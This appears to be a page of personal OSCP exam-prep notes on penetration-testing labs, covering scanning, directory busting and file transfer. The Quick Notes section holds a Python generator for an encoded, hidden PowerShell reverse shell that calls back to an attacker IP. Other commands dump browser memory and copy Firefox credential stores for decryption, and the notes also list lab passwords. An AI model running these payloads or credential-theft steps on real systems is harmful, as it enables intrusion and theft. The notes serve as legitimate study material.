<!DOCTYPE HTML>
<html lang="en" class="light" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Brandon&#x27;s OSCP Notes</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

    </head>
    <body class="sidebar-visible no-js">
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('light')
            html.classList.add(theme);
            var body = document.querySelector('body');
            body.classList.remove('no-js')
            body.classList.add('js');
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var body = document.querySelector('body');
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            body.classList.remove('sidebar-visible');
            body.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">2.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">2.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">2.3.</strong> File Transfer</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="AddnlFileTrasnfer.html"><strong aria-hidden="true">2.3.1.</strong> Additional File Transfer</a></li></ol></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">2.4.</strong> Ports</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="SSHKeys.html"><strong aria-hidden="true">2.4.1.</strong> SSH Keys</a></li><li class="chapter-item expanded "><a href="sshcheatsheet.html"><strong aria-hidden="true">2.4.2.</strong> SSH Cheat Sheet</a></li></ol></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">2.5.</strong> Shells</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">2.6.</strong> Web Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html"><strong aria-hidden="true">3.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Impacket.html"><strong aria-hidden="true">3.2.</strong> Impacket</a></li><li class="chapter-item expanded "><a href="RDPEXploit.html"><strong aria-hidden="true">3.3.</strong> RDP Exploits</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.4.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">3.4.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html"><strong aria-hidden="true">3.4.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">3.4.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">3.5.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="CMSs.html"><strong aria-hidden="true">3.6.</strong> CMSs</a></li><li class="chapter-item expanded "><a href="File Uploads.html"><strong aria-hidden="true">3.7.</strong> File Uploads</a></li><li class="chapter-item expanded "><a href="AddnlFileUpload.html"><strong aria-hidden="true">3.8.</strong> Additional File Upload</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">3.8.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">3.8.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">3.8.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">3.9.</strong> LFI/RFI</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="LFIRFIMore.html"><strong aria-hidden="true">3.9.1.</strong> LFIRFI_More</a></li></ol></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">3.10.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">3.11.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">3.12.</strong> SQL</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="MoreSQL.html"><strong aria-hidden="true">3.12.1.</strong> More SQL</a></li><li class="chapter-item expanded "><a href="PSQL.html"><strong aria-hidden="true">3.12.2.</strong> PSQL</a></li><li class="chapter-item expanded "><a href="MyMySql.html"><strong aria-hidden="true">3.12.3.</strong> MySQL</a></li><li class="chapter-item expanded "><a href="MSSQL.html"><strong aria-hidden="true">3.12.4.</strong> MSSQL</a></li></ol></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">3.13.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">3.14.</strong> XXE_XSS_Deserialization</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="XXMore.html"><strong aria-hidden="true">3.14.1.</strong> XSS_More</a></li><li class="chapter-item expanded "><a href="XXXEMore.html"><strong aria-hidden="true">3.14.2.</strong> XXE More</a></li><li class="chapter-item expanded "><a href="CSRF.html"><strong aria-hidden="true">3.14.3.</strong> CSRF</a></li><li class="chapter-item expanded "><a href="SSRF.html"><strong aria-hidden="true">3.14.4.</strong> SSRF</a></li></ol></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">3.15.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENLinNotes.html"><strong aria-hidden="true">4.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">5.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">5.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENWinNotes.html"><strong aria-hidden="true">5.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="KerberosCheetSheet.html"><strong aria-hidden="true">6.1.</strong> Kerberos Cheat Sheet</a></li><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">6.2.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html"><strong aria-hidden="true">6.3.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">6.4.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html"><strong aria-hidden="true">6.5.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">6.6.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">6.7.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html"><strong aria-hidden="true">6.8.</strong> Persistence</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="welcome-to-my-oscp-mdbook"><a class="header" href="#welcome-to-my-oscp-mdbook">Welcome to my OSCP mdBook</a></h1>
<p>Currently, I'm preparing for the OSCP exam. While I utilize Obsidian for note-taking, I've discovered the advantage of having a well-formatted notebook for reference over a conventional note-taking application. This document is dynamic, undergoing multiple updates throughout the day.</p>
<p>Checkout my LinkedIn and Website:</p>
<ul>
<li><a href="https://www.linkedin.com/in/brandon-r-russell">LinkedIn</a></li>
<li><a href="https://brandonrussell.io/">Website</a></li>
</ul>
<p><img src="IntroImage.png" alt="OSCPNotes" /></p>
<p>-Brandon</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="quick-notes"><a class="header" href="#quick-notes">Quick Notes</a></h2>
<h2 id="links"><a class="header" href="#links">Links</a></h2>
<ul>
<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/">Payload All The Things</a></li>
<li><a href="https://swisskyrepo.github.io/InternalAllTheThings/">Internal All The Things</a></li>
<li><a href="https://gchq.github.io/CyberChef/">CyberChef</a></li>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/">Total OSCP Guide</a></li>
<li><a href="https://wordpress.com/support/markdown-quick-reference/">Markdown Reference</a></li>
<li><a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown/tree/master">Report Maker</a></li>
</ul>
<h3 id="random-things"><a class="header" href="#random-things">Random things</a></h3>
<h3 id="dont-forget-to-search-files"><a class="header" href="#dont-forget-to-search-files">Don't forget to search files</a></h3>
<pre><code>Remember if you come across random files you can use 'exiftool' on them, might get some usernames.

</code></pre>
<h2 id="etchosts"><a class="header" href="#etchosts">/etc/hosts</a></h2>
<pre><code>Get into the habit of saving IP into /etc/hosts, if it's a DC, also do this:

echo "10.129.229.27 intentions.htb" | sudo tee -a /etc/hosts

10.129.26.67 dc.flight.htb flight.htb dc


</code></pre>
<h2 id="saving-things-into-files-quickly"><a class="header" href="#saving-things-into-files-quickly">Saving things into files quickly</a></h2>
<pre><code>For example, if you have a username/hash dump, save into a file:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::

cat secrets | cut -d ":" -f 1 | tee users
cat secrets | cut -d ":" -f 4 | tee passwords


or:

lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users


or to get first word before space: 

awk '{print $1}' profiles &gt; users
</code></pre>
<h2 id="variables"><a class="header" href="#variables">Variables</a></h2>
<pre><code>export IP=""

export PORT="" #web server port I'm actively enumerating

export PORTS="". #all of the available ports

export LHOST=""

export LPORT="" #to catch reverse shells

export URL="" # for when you need to scan an fqdn rather than an IP like on htb.
</code></pre>
<h3 id="remote-desktop-specific"><a class="header" href="#remote-desktop-specific">Remote Desktop Specific</a></h3>
<pre><code>xfreerdp /cert-ignore /compression /auto-reconnect /u:dmzadmin /p:SlimGodhoodMope /v:192.168.188.191 /w:1600 /h:800 

or 

rdesktop -z -P -x m -u dmzadmin -p SlimGodhoodMope 192.168.188.191 -r 

</code></pre>
<h3 id="powershell-bypass-policy"><a class="header" href="#powershell-bypass-policy">Powershell Bypass Policy</a></h3>
<pre><code>Do this to run powershell:
powershell -ExecutionPolicy Bypass -File GetCLSID.ps1
</code></pre>
<h3 id="kill-a-process"><a class="header" href="#kill-a-process">Kill a Process</a></h3>
<pre><code>
To kill a port process on windows:

netstat -ano | findstr :&lt;PORT&gt;
taskkill /PID &lt;PID&gt; /F

To kill a port process on Kali:

sudo fuser -k 81/udp
</code></pre>
<h3 id="port-listening"><a class="header" href="#port-listening">Port Listening</a></h3>
<pre><code>UNIX Domain Socket and How to listen it? 

 Use one of the option

1 - nc -lU &lt;socket path&gt;

nc: We all know this..

-l: This option tells netcat to operate in listening mode, which means it will listen for incoming connections.

-U: This option specifies that the listener should use Unix domain sockets. Unix domain sockets are a type of inter-process communication mechanism on Unix-like operating systems. They are used for communication between processes on the same host.

&lt;socket path&gt;: This is the path to the Unix domain socket that socat will listen on, for example "/tmp/s"

2 - socat - UNIX-LISTEN:&lt;socket path&gt;

socat: We all know this.

UNIX: Indicates that the endpoint will be a Unix domain socket.

LISTEN: Specifies that socat should listen for incoming connections on the socket.

&lt;socket path&gt;: As explianed before.


</code></pre>
<h3 id="find-things"><a class="header" href="#find-things">Find Things</a></h3>
<pre><code>dir -recurse *.php | select-string -pattern "database"

# Getting passwords from browser memory
procdump.exe -ma firefox_pid
strings.exe firefox.dmp | findstr /i "Passwd="


To find things:

locate something
find / -name exact_name&gt;/dev/null
find /home -name *.jpg

-O1 – (Default) filter based on file name first
-O2 – File name first, then file-type
-O3 – Allow find to automatically re-order the search based on efficient use of resources and likelihood of success
-maxdepth X – Search this directory along with all sub-directories to a level of X
-iname – Search while ignoring text case.
-not – Only produce results that don’t match the test case
-type f – Look for files
-type d – Look for directories


To search for text within files:
grep mail /etc/passwd


On Windows:

Get-ChildItem -Path C:\ -Include *.kdbx* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *proof.txt* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *password* -File -Recurse -ErrorAction SilentlyContinue

FINDSTR /i /r /c:"hello.*goodbye" /c:"goodbye.*hello" Demo.txt

FIND [SWITCH] "String" [Pathname/s]

1. /v – This switch will show any lines that don’t contain the string of words you specified.
2. /c – This switch tells the find tool to count how many lines contain your search terms.
3. /n – This switch shows the numbers that correspond with the lines.
4. /i – This switch tells find to ignore the case of text you are searching for.
</code></pre>
<h3 id="fix-kali-copy-paste-issue"><a class="header" href="#fix-kali-copy-paste-issue">Fix Kali Copy Paste Issue</a></h3>
<pre><code>Kali VM Fix Copy/Paste:

1. `sudo apt-get autoremove open-vm-tools`
2. Install VMware Tools by following the usual method (`Virtual Machine --&gt; Reinstall VMWare Tools`)
3. Reboot the VM
4. `sudo apt-get install open-vm-tools-desktop`
5. Reboot the VM, after the reboot copy/paste and drag/drop will work!



Quick Python Powershell Reverse Shell generator
---

import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.164",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

</code></pre>
<h3 id="show-tun0-ip-toolbar"><a class="header" href="#show-tun0-ip-toolbar">Show Tun0 IP Toolbar</a></h3>
<pre><code>sudo apt install xfce4-genmon-plugin

Generic Monitor -&gt; Properties

/opt/showtun0ip.sh

---
ADDR=$(ip addr | grep tun0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
echo "$ADDR" | sed 's/$/ /g'


</code></pre>
<h2 id="proxychains"><a class="header" href="#proxychains">ProxyChains</a></h2>
<pre><code>
Nomrally used with chisel, so standard:

socks5 127.0.0.1 1080

Also, squid proxy for example with username + password after ip and port:

http 192.168.219.224 3128 ext_acc DoNotShare!SkyLarkLegacyInternal2008
</code></pre>
<h2 id="reading-files"><a class="header" href="#reading-files">Reading Files</a></h2>
<pre><code>Linux just use cat, mousepad, nano, vim

Also, if you need to add a line to a file, but don't have nano editor you can:

echo "Something to append" &gt;&gt; filename

Windows use more or less... or type &lt;filename&gt; | more


</code></pre>
<h2 id="need-a-gui-file-explorer--admin"><a class="header" href="#need-a-gui-file-explorer--admin">Need a GUI File Explorer + Admin</a></h2>
<pre><code>sudo thunar
</code></pre>
<h2 id="report-building"><a class="header" href="#report-building">Report Building</a></h2>
<pre><code>
https://github.com/noraj/OSCP-Exam-Report-Template-Markdown

This builds the template:
ruby osert.rb init

You can cope this over to Obsidian, will make it easy to build out report.

Keep in mind, there might be file permission issues, so make sure chmod on this file after you copy it.

When done, you will need to copy this and all images back into the Report Building folder.

Do this to build the repot

ruby osert.rb generate -i &lt;filename&gt;.md 


</code></pre>
<h3 id="fun-fact"><a class="header" href="#fun-fact">Fun Fact</a></h3>
<p>https://github.com/AlessandroZ/LaZagne
https://github.com/unode/firefox_decrypt</p>
<pre><code>Do this to find passwords in Firefox folder

.\lazagne.exe all


or use this tool to read through the various files in a .mozilla folder for passwords:

https://github.com/unode/firefox_decrypt

Like the InsanityHosting on PG:

scp -o StrictHostKeyChecking=no -r elliot@$ip:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cert9.db .

scp -o StrictHostKeyChecking=no -r elliot@$ip:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cookies.sqlite .

scp -o StrictHostKeyChecking=no -r elliot@$ip:/home/elliot/.mozilla/firefox/esmhp32w.default-default/key4.db .

scp -o StrictHostKeyChecking=no -r elliot@$ip:/home/elliot/.mozilla/firefox/esmhp32w.default-default/logins.json .

/opt/firefox_decrypt/firefox_decrypt.py .



</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="scanning"><a class="header" href="#scanning">Scanning</a></h2>
<h3 id="nmap-scans"><a class="header" href="#nmap-scans">Nmap Scans</a></h3>
<pre><code>export ip=192.168.201.222 

nmap -A -p- -T4 -O $ip

--script vuln, http-enum, http-headers

nmap -T4 -p- -A $ip$ # T0 -&gt; slowest but covert, T4 -&gt; aggressive but noisy.
nmap -sU --top-ports 100 -vvv $ip # UDP Ports
nmap --top-ports 100 -F # Top 100 Ports 
nmap -p1-1023 $ip # Port Range 
nmap -p22,80,443 $ip # Specific Ports 
nmap $ip/24 # Subnet
nmap -sT -p- --min-rate 5000 --max-retries 1 $ip # TCP Ports 
nmap -sU -p- --min-rate 5000 --max-retries 1 $ip # UDP Ports

TFTP
nmap -Pn -sU -p69 --script tftp-enum 192.168.10.250
nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=customlist.txt &lt;host&gt;
</code></pre>
<h3 id="rustscan--autorecon--nmapautomator"><a class="header" href="#rustscan--autorecon--nmapautomator">RustScan &amp; Autorecon &amp; nmapAutomator</a></h3>
<pre><code>RustScan:  docker run -it --rm --name rustscan rustscan/rustscan:2.0.0 -a $ip range 0-65535 -- -A

Autorecon: autorecon $ip 

or if root I think supposed to do this:

env "PATH=$PATH" autorecon $ip

./nmapAutomator.sh -H $ip -t Recon
</code></pre>
<h3 id="powershell-port-scan"><a class="header" href="#powershell-port-scan">Powershell Port Scan</a></h3>
<pre><code>Test-NetConnection -Port 445 192.168.50.151
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2&gt;$null
</code></pre>
<h3 id="bash-port-scan"><a class="header" href="#bash-port-scan">Bash Port Scan</a></h3>
<pre><code>
for i in $(seq 1 254); do nc -zv -w 1 172.16.210.$i 445; done

</code></pre>
<h3 id="python-port-scan"><a class="header" href="#python-port-scan">Python Port Scan</a></h3>
<pre><code>
import pyfiglet
import sys
import socket
from datetime import datetime

ascii_banner = pyfiglet.figlet_format("PORT SCANNER")
print(ascii_banner)

# Defining a target
if len(sys.argv) == 2:
	
	# translate hostname to IPv4
	target = socket.gethostbyname(sys.argv[1]) 
else:
	print("Invalid amount of Argument")

# Add Banner 
print("-" * 50)
print("Scanning Target: " + target)
print("Scanning started at:" + str(datetime.now()))
print("-" * 50)

try:
	
	# will scan ports between 1 to 65,535
	for port in range(1,65535):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		socket.setdefaulttimeout(1)
		
		# returns an error indicator
		result = s.connect_ex((target,port))
		if result ==0:
			print("Port {} is open".format(port))
		s.close()
		
except KeyboardInterrupt:
		print("\n Exiting Program !!!!")
		sys.exit()
except socket.gaierror:
		print("\n Hostname Could Not Be Resolved !!!!")
		sys.exit()
except socket.error:
		print("\ Server not responding !!!!")
		sys.exit()


</code></pre>
<h3 id="directory-busting"><a class="header" href="#directory-busting">Directory Busting</a></h3>
<pre><code>Usually the goto:

dirsearch -u $ip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 http://$ip:80/FUZZ/

Don't forget subdomains:

gobuster dns -d marshalled.pg -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30 

wfuzz -u http://10.10.11.187 -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7069

Don't forget the files!
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 http://$ip:80/FUZZ/

Don't forget you can do authenticated + LFI checks:
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u $ip/manage.php?file=FUZZ -b "PHPSESSID=hi49mu76vogdmne2ju7c6556fi" | grep "passwd"


Few other options:

dirb http:///$ip/ # If port -&gt; 443, Do HTTPS

gobuster dir -x php,txt,xml,asp,aspx --url http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -b 404 -f 

feroxbuster --url http://$ip/ --filter-status 401,402,403,404 -x txt,cgi,sh,pl,asp,aspx,php --depth 2 --output ferox.result -k --

wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f

ffuf -c -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

python /opt/Sublist3r/sublist3r.py -d devvortex.htb

dirbuster -u http://10.10.105.213/

dirsearch -u url -w wordlist

dirsearch -u http://192.168.213.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 http://$ip/FUZZ


</code></pre>
<h3 id="custom-python-web-directory-search-tool"><a class="header" href="#custom-python-web-directory-search-tool">Custom Python Web Directory Search Tool</a></h3>
<p>https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html</p>
<pre><code class="language-python">This was from the intelligence htb box, maybe modify if you see something similiar in the future:

#!/usr/bin/env python3

import datetime
import io
import PyPDF2
import requests


t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
users = set()

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        with io.BytesIO(resp.content) as data:
            pdf = PyPDF2.PdfFileReader(data)
            users.add(pdf.getDocumentInfo()['/Creator'])
            for page in range(pdf.getNumPages()):
                text = pdf.getPage(page).extractText()
                if any([k in text.lower() for k in keywords]):
                    print(f'==={url}===\n{text}')
    t = t + datetime.timedelta(days=1)
    if t &gt;= end:
        break

with open('users', 'w') as f:
    f.write('\n'.join(users)) 
</code></pre>
<h3 id="vulnerability-scanner"><a class="header" href="#vulnerability-scanner">Vulnerability Scanner</a></h3>
<pre><code>nikto -host http://$ip/ # If port -&gt; 443, Do HTTPS



enum4linux $ip
</code></pre>
<h3 id="wp-scan"><a class="header" href="#wp-scan">WP Scan</a></h3>
<pre><code>Enumerating Users
wpscan --url [target-url] --enumerate u

Enumerating Plugins
wpscan --url [target-url] --enumerate p

Enumerating Themes
wpscan --url [target-url] --enumerate t

Brute Forcing Passwords
wpscan --url [target-url] --passwords [path-to-wordlist] --usernames [user1,user2,...

Detecting Vulnerable Plugins or Themes
wpscan --url [target-url] --enumerate vp,vt

Running All Scans
wpscan --url [target-url] -e

API Token
wpscan --url [target-url] --api-token [YourWPScanAPIToken]

</code></pre>
<h3 id="nmap-cheat-sheet"><a class="header" href="#nmap-cheat-sheet">Nmap Cheat Sheet</a></h3>
<p><img src="nmapcheatsheet.png" alt="nMap Cheat Sheet" /></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="file-transfer"><a class="header" href="#file-transfer">File Transfer</a></h2>
<h3 id="links-1"><a class="header" href="#links-1">Links</a></h3>
<ul>
<li><a href="https://juggernaut-sec.com/windows-file-transfers-for-hackers/">Windows File Transfer</a></li>
</ul>
<h3 id="introduction"><a class="header" href="#introduction"><strong>Introduction</strong></a></h3>
<p>When performing enumeration steps during a penetration test, there is often the need to transfer files to or from the victim machine, for example to run custom scripts or analyze files further in a controlled environment.</p>
<p>There are different techniques and tools that can be used to transfer files and depending on the target operating system and installed software these may or may not work. The purpose of this cheat sheet is to provide an exhaustive resource for transferring files using command-line interfaces.</p>
<h3 id="hosting-files"><a class="header" href="#hosting-files"><strong>Hosting Files</strong></a></h3>
